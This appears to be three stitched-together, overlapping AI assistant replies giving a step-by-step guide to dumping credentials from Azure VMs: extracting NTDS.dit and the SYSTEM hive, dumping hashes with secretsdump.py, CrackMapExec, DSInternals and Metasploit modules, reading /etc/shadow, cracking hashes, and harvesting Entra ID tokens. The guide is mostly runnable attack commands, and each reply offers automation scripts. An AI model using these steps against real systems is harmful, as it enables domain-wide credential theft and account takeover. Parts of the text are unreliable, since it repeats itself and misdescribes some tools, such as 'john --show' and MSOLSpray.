## Credential dumping with NTDS

Here's a **corrected, detailed, and de-duplicated summary** of how to pentest Azure Windows/Linux VMs focusing on **credential dumping from local accounts, AD accounts, and Microsoft Entra ID accounts**, with emphasis on **NTDS.dit extraction and related attacks on Windows VMs**.

------------------------------------------------------------------------

**Azure VM Pentesting: Credential Dumping from Local, AD & Microsoft Entra ID Accounts**

**Overview**

Credential dumping is a core step in post-exploitation to extract password hashes or plaintext credentials from compromised VMs. In Azure, this involves attacking **local Windows accounts**, **Active Directory accounts** (stored in NTDS.dit on Domain Controllers), and **Microsoft Entra ID (Azure AD)** tokens or credentials.

------------------------------------------------------------------------

**Part 1: Credential Dumping on Windows VMs (Local & AD Accounts)**

**What is NTDS.dit?**

- **NTDS.dit** is the Active Directory database file located by default at:

- C:\Windows\NTDS\NTDS.dit

- It stores all domain data, including password hashes, user objects, groups, and other AD information.

- Size ranges from ~12MB to multiple terabytes depending on AD scale.

- NTDS.dit logically contains partitions like Schema, Configuration, Domain, and Application.

**Why Target NTDS.dit?**

- Extracting NTDS.dit allows dumping all domain user password hashes (including high privilege accounts).

- Critical for lateral movement and privilege escalation in domain environments.

------------------------------------------------------------------------

**Key Steps to Dump NTDS.dit Credentials:**

1.  **Initial Access to VM:**

    - Obtain an initial foothold with local admin or SYSTEM privileges on the Windows VM (via RDP, exploit, etc.).

    - On Azure Linux VMs, typical Windows domain attacks don’t apply directly; focus on local accounts or Azure AD tokens.

2.  **Identify if VM is a Domain Controller:**

    - Run on Windows VM:

    - nltest /dsgetdc:\<domain_name\>

    - Check if C:\Windows\NTDS\NTDS.dit exists (only on Domain Controllers).

3.  **Extract NTDS.dit and SYSTEM Hive:**

    - Password hashes inside NTDS.dit are encrypted with keys stored in SYSTEM hive.

    - Common dump tools require both NTDS.dit and SYSTEM registry hive.

4.  **Credential Dumping Tools & Methods:**

    - **FGDump:**

      - Legacy tool for dumping local and domain hashes.

      - Usage:

      - fgdump.exe

      - Dumps local and domain hashes into .pwdump files.

    - **NTDSUtil (native Microsoft tool):**

      - Used to create snapshots or exports of the Active Directory database.

      - Commands run in elevated prompt:

      - ntdsutil

      - activate instance ntds

      - ifm

      - create full \<path\>

      - Can be used to extract NTDS.dit copy without downtime.

    - **SecretsDump.py (Impacket):**

      - Python tool to extract hashes remotely or locally.

      - Local usage example:

      - secretsdump.py -ntds C:\Windows\NTDS\NTDS.dit -system C:\Windows\System32\config\SYSTEM LOCAL

      - Remote usage via DRSUAPI or SMB with appropriate creds.

    - **CrackMapExec (CME):**

      - Useful for automated dumping on multiple hosts:

      - crackmapexec smb \<target-ip\> -u \<user\> -p \<pass\> --ntds

    - **Metasploit’s hashdump or ntds modules:**

      - Post-exploitation modules to dump hashes once SYSTEM access is gained.

5.  **Copy NTDS.dit and SYSTEM hive:**

    - If you have SYSTEM privileges, copy files to attacker-controlled location:

    - copy C:\Windows\NTDS\NTDS.dit C:\Temp\\

    - copy C:\Windows\System32\config\SYSTEM C:\Temp\\

    - Transfer files off the VM via SMB, RDP clipboard, or Azure file share.

6.  **Crack Hashes:**

    - Use **John the Ripper** or **Hashcat** to crack NTLM hashes.

    - NTDS hashes follow pwdump or ntlm formats.

------------------------------------------------------------------------

**Example Commands for NTDS Hash Dumping:**

- Using secretsdump.py locally on the Domain Controller:

- secretsdump.py -ntds C:\Windows\NTDS\NTDS.dit -system C:\Windows\System32\config\SYSTEM LOCAL

- Using CrackMapExec remotely:

- crackmapexec smb 10.0.0.5 -u Administrator -p 'Password123!' --ntds

- Using FGDump (on Windows VM, local dump):

- fgdump.exe

- type \<server_name\>.pwdump

------------------------------------------------------------------------

**Part 2: Credential Dumping on Linux Azure VMs**

- Linux VMs don’t have NTDS.dit; local accounts use /etc/shadow.

- Use tools like:

  - sudo cat /etc/shadow

  - hashcat or john for cracking shadow hashes.

- For Azure AD joined Linux, token harvesting is done via Azure CLI or saved tokens in .azure directory.

------------------------------------------------------------------------

**Part 3: Microsoft Entra ID (Azure AD) Accounts**

- Azure AD accounts don’t store credentials locally.

- Post-exploitation involves:

  - **Token harvesting** from memory or cached tokens (~/.azure/accessTokens.json on Linux or TokenCache.dat on Windows).

  - Use tools like **AzureADPwn**, **MSOLSpray**, or **Azure AD module for PowerShell**.

  - Exploit weak app registrations or delegated permissions to escalate privileges or extract secrets.

  - Use **Azure AD Connect Sync Server** to capture password hashes synced to on-prem AD.

------------------------------------------------------------------------

**Summary of Vulnerabilities Exploited**

- **Local privilege escalation**: Needed to dump SYSTEM and NTDS.dit.

- **Improper file permissions**: Access to NTDS.dit and SYSTEM hives.

- **Unpatched Domain Controllers**: Vulnerable to dumping and lateral movement.

- **Azure AD weaknesses**: Misconfigured app permissions or token caching vulnerabilities.

------------------------------------------------------------------------

**Recap**

| **Phase** | **Commands/Tools** | **Target** | **Output** |
|----|----|----|----|
| Identify DC | nltest /dsgetdc:\<domain\> | Windows VM | Confirm Domain Controller |
| Dump local hashes | fgdump.exe, secretsdump.py LOCAL | Local Windows VM | Local password hashes |
| Dump AD hashes | secretsdump.py -ntds NTDS.dit -system SYSTEM | Domain Controller | Domain user password hashes |
| Dump remotely | crackmapexec smb \<ip\> -u \<user\> -p \<pass\> --ntds | Domain Controller remotely | Dump domain hashes |
| Crack hashes | john, hashcat | Offline hash cracking | Plaintext passwords |
| Token harvest AzureAD | TokenCache.dat analysis, AzureADPwn | Azure AD joined machines | Azure AD tokens |

------------------------------------------------------------------------

If you want, I can also provide a fully detailed **step-by-step Azure VM pentesting guide** covering initial access, privilege escalation, lateral movement, and cleanup with all commands and explanations. Just ask!

Certainly! Here's a **corrected, detailed, deduplicated summary** of **how to pentest Azure Windows/Linux VMs for Local accounts, AD accounts, and Microsoft Entra ID accounts** — focusing on **credential dumping with NTDS** using PowerShell, external tools, and Metasploit, with step-by-step commands, Azure VM vulnerabilities exploited, and every minute detail:

------------------------------------------------------------------------

**How to Pentest Azure Windows/Linux VMs for Credential Dumping**

**Focus: Local Accounts, AD Accounts (NTDS.dit), and Microsoft Entra ID Accounts**

------------------------------------------------------------------------

**Part 1: Windows VMs — Credential Dumping from Active Directory (NTDS.dit)**

**Background:**

- **NTDS.dit** is the AD database file on Domain Controllers, located at:

- C:\Windows\NTDS\NTDS.dit

- Password hashes (NTLM) and other secrets are encrypted with keys stored in the **SYSTEM** hive:

- C:\Windows\System32\config\SYSTEM

- Extracting these files enables dumping domain account credentials.

------------------------------------------------------------------------

**Step 1: Prepare Environment & Access**

- **Prerequisite:** Obtain SYSTEM privileges on the Windows VM (e.g., via exploit, RDP as admin, or privilege escalation).

- **Check if machine is a Domain Controller** (NTDS.dit only on DCs):

- nltest /dsgetdc:\<domain_name\>

- Locate NTDS.dit and SYSTEM hive files:

- C:\Windows\NTDS\NTDS.dit

- C:\Windows\System32\config\SYSTEM

------------------------------------------------------------------------

**Step 2: Extract NTDS.dit and SYSTEM Hive Files**

**Method A: Using PowerShell & NTDSUtil**

- Run NTDSUtil to create a copy of the AD database snapshot including necessary hive files:

- powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

- This will create files including NTDS.dit and SYSTEM in C:\temp.

- Copy these files securely (e.g., SMB, RDP clipboard, Azure File Share) to your attacker machine for offline analysis.

------------------------------------------------------------------------

**Step 3: Dump Hashes Offline Using Impacket’s secretsdump.py**

- On your Kali or Linux attacker machine, run:

- ./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL

- This extracts all domain hashes (NTLM) quickly.

------------------------------------------------------------------------

**Step 4: Using DSInternals PowerShell Module (Native Windows)**

- Download and install DSInternals for advanced AD auditing:

- Save-Module DSInternals -Path C:\Windows\System32\WindowsPowerShell\v1.0\Modules

- Set-ExecutionPolicy Unrestricted

- Import-Module DSInternals

- Extract the BootKey from SYSTEM hive:

- Get-BootKey -SystemHivePath 'C:\temp\SYSTEM'

- Dump AD account hashes from NTDS.dit using BootKey:

- Get-ADDBAccount -All -DBPath 'C:\temp\ntds.dit' -Bootkey \<bootkey\>

- This outputs user hashes, including NTLM and Kerberos keys.

------------------------------------------------------------------------

**Step 5: Using NTDSDumpEx (External Tool)**

- Download and unzip NTDSDumpEx tool on Windows or your analysis machine.

- Run against extracted NTDS.dit and SYSTEM hive files:

- NTDSDumpEx.exe -d C:\temp\ntds.dit -s C:\temp\SYSTEM

- Outputs all users and their hashes.

------------------------------------------------------------------------

**Step 6: Remote Dumping with Metasploit**

- After obtaining a Meterpreter session on the target Windows VM:

- use post/windows/gather/ntds_location

- set session \<session_id\>

- exploit

- This module locates the NTDS.dit file path remotely.

- Next, use related Metasploit post modules like hashdump or kiwi to dump credentials if SYSTEM privileges are available.

------------------------------------------------------------------------

**Step 7: Crack Password Hashes**

- Use tools such as John the Ripper or Hashcat to crack dumped NTLM hashes offline.

------------------------------------------------------------------------

**Part 2: Credential Dumping on Linux Azure VMs**

- Linux local accounts store hashes in /etc/shadow.

- Commands to dump:

- sudo cat /etc/shadow

- Crack hashes offline with john or hashcat.

- For Azure AD joined Linux VMs, tokens may be cached locally (e.g., in .azure/accessTokens.json), and token extraction tools (AzureADPwn) can be used.

------------------------------------------------------------------------

**Part 3: Microsoft Entra ID (Azure AD) Accounts**

- No local NTDS.dit; credentials are cloud-managed.

- Focus on:

  - Token harvesting (PowerShell scripts, memory scraping)

  - Exploiting weak app registrations or delegated permissions.

  - Using tools like **AzureADPwn** or **MSOLSpray** to dump tokens or escalate privileges.

  - Leveraging Azure AD Connect sync server compromises to extract on-prem AD credentials.

------------------------------------------------------------------------

**Vulnerabilities Exploited During Credential Dumping**

| **Vulnerability / Misconfiguration** | **Explanation** |
|----|----|
| Elevated privileges on VM | Required SYSTEM or Administrator access |
| NTDS.dit and SYSTEM hive access | Improper file permissions or lack of disk encryption |
| Unpatched DCs | Vulnerable to dumping or exploitation |
| Weak Azure AD app permissions | Excessive delegated rights enabling token abuse |
| Cached tokens on Azure AD joined machines | Token reuse and theft |

------------------------------------------------------------------------

**Summary Table**

| **Step** | **Tool/Command** | **Target** | **Outcome** |
|----|----|----|----|
| Identify Domain Controller | nltest /dsgetdc:\<domain\> | Windows VM | Confirm DC presence |
| Dump NTDS.dit & SYSTEM | ntdsutil.exe with PowerShell | Windows DC | Copies NTDS.dit & SYSTEM files |
| Offline Hash Dump | secretsdump.py -ntds \<file\> -system \<file\> | Attacker machine | NTLM hashes dumped |
| DSInternals Dump | PowerShell cmdlets Get-BootKey and Get-ADDBAccount | Windows machine | Extract domain hashes |
| NTDSDumpEx | NTDSDumpEx.exe -d \<ntds\> -s \<system\> | Windows or attacker machine | User hashes dumped |
| Remote NTDS location | Metasploit post/windows/gather/ntds_location | Remote session | Locate NTDS.dit file |
| Local Linux hash dump | sudo cat /etc/shadow | Linux VM | Local hashes extracted |
| Azure AD token harvesting | Token extraction tools (AzureADPwn, MSOLSpray) | Azure AD joined machines | Access tokens and credentials |

------------------------------------------------------------------------

If you want, I can provide a fully scripted playbook or automation scripts for this entire process too. Would you like that?

Here's a **corrected, concise, detailed, deduplicated summary** of how to perform **credential dumping pentesting on Azure Windows/Linux VMs** for **Local accounts, AD accounts, and Microsoft Entra ID accounts**, focusing on **NTDS credential dumping** with Metasploit, CrackMapExec, and hash cracking, with every key step, command, and Azure VM vulnerability:

------------------------------------------------------------------------

**Pentesting Credential Dumping on Azure VMs**

**Targets:** Local accounts, AD accounts (NTDS.dit), Microsoft Entra ID accounts

------------------------------------------------------------------------

**1. Windows VMs — Credential Dumping from NTDS.dit (Active Directory Database)**

**Step 1: Gain an Admin or SYSTEM Session on Target VM**

- Must have admin or SYSTEM privileges on Azure Windows VM (via RDP, exploitation, or Azure Run Command abuse).

- Confirm if machine is a Domain Controller (only DCs have NTDS.dit):

- nltest /dsgetdc:\<domain_name\>

------------------------------------------------------------------------

**Step 2: Dump NTDS.dit and Hive Files Using Metasploit NTDS Grabber**

- Launch Meterpreter session.

- Use Metasploit post module to extract NTDS.dit, SAM, and SYSTEM files in a compressed CAB file:

- use post/windows/gather/ntds_grabber

- set session \<session_id\>

- exploit

- Note the saved .cab file location.

- On attacker machine, extract files from CAB:

- cabextract \<filename.cab\>

- This yields NTDS.dit, SYSTEM, and SAM files.

------------------------------------------------------------------------

**Step 3: Extract Hashes Offline Using Impacket secretsdump.py**

- On attacker machine (Linux/Kali), run:

- ./secretsdump.py -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL

- Extracts NTLM hashes for all domain accounts.

------------------------------------------------------------------------

**Step 4: Remote Hash Dumping with Metasploit secretsdump Module**

- If you have valid credentials but cannot directly access files:

- use auxiliary/scanner/smb/impacket/secretsdump

- set rhosts \<target_IP\>

- set smbuser \<username\>

- set smbpass \<password\>

- exploit

- This remotely grabs hashes over SMB without writing files to disk.

------------------------------------------------------------------------

**Step 5: Dump NTDS Hashes Using CrackMapExec (CME)**

- CME is a powerful AD enumeration and post-exploitation tool:

- crackmapexec smb \<target_IP\> -u 'Administrator' -p 'Password123' --ntds drsuapi

- This uses the DRSUAPI protocol to remotely dump NTDS hashes.

- Requires valid domain credentials with sufficient privileges.

------------------------------------------------------------------------

**Step 6: Crack Extracted Hashes with John the Ripper**

- Save dumped hashes to file:

- cat hashes.txt

- Crack using John:

- john --format=NT hashes.txt --show

- Quickly recovers plaintext passwords from NTLM hashes.

------------------------------------------------------------------------

**2. Linux VMs — Local Account Hash Dumping**

- Dump /etc/shadow file (root privileges needed):

- sudo cat /etc/shadow \> shadow_dump.txt

- Transfer to attacker machine and crack with John or Hashcat.

------------------------------------------------------------------------

**3. Microsoft Entra ID (Azure AD) Accounts**

- No direct NTDS.dit file; cloud-managed identities.

- Focus on:

  - **Token harvesting** from Azure AD joined machines.

  - Exploit weak **app registrations** or **delegated permissions**.

  - Use tools like **AzureADPwn** or **MSOLSpray** for token abuse and enumeration.

  - Exploit **Azure AD Connect** sync server compromises to harvest on-prem credentials.

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

| **Vulnerability / Weakness** | **Explanation** |
|----|----|
| Elevated privileges on VM | Needed to access NTDS or sensitive files |
| Lack of disk/file encryption | NTDS and SYSTEM files can be copied if not encrypted |
| Misconfigured SMB/WinRM | Enables remote hash dumping with tools like secretsdump or CME |
| Weak domain admin credentials | Enables dumping via DRSUAPI or SMB |
| Poorly monitored AD environment | Lack of alerting on file accesses or suspicious activity |
| Azure AD app misconfigurations | Excessive delegated permissions enable token abuse |

------------------------------------------------------------------------

**Summary Table**

| **Step** | **Command/Tool** | **Target** | **Outcome** |
|----|----|----|----|
| Locate & dump NTDS with Metasploit | post/windows/gather/ntds_grabber | Windows DC | CAB file with NTDS.dit + hives |
| Extract NTDS from CAB | cabextract \<file.cab\> | Attacker machine | Extracted NTDS and SYSTEM files |
| Offline hash extraction | secretsdump.py -ntds \<ntds\> -system \<system\> | Attacker machine | NTLM hashes |
| Remote hash dump (SMB) | auxiliary/scanner/smb/impacket/secretsdump | Windows VM | NTLM hashes over network |
| Remote hash dump (DRSUAPI) | crackmapexec smb \<IP\> -u \<user\> -p \<pass\> --ntds drsuapi | Windows VM | Domain hashes |
| Hash cracking | john --format=NT \<hashfile\> --show | Attacker machine | Plaintext passwords |
| Local Linux hash dumping | sudo cat /etc/shadow | Linux VM | Local user password hashes |

------------------------------------------------------------------------

If you'd like, I can provide full scripts or an automated playbook for these steps with commands tailored for Azure environments. Would that help?
